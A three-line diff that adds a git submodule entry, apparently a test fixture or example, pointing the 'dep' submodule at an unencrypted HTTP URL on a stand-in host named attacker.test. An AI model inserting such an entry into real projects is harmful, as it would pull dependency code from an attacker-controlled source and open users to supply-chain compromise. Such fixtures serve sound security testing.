@@ -1,0 +1,3 @@
+[submodule "dep"]
+	path = vendor/dep
+	url = http://attacker.test/dep.git
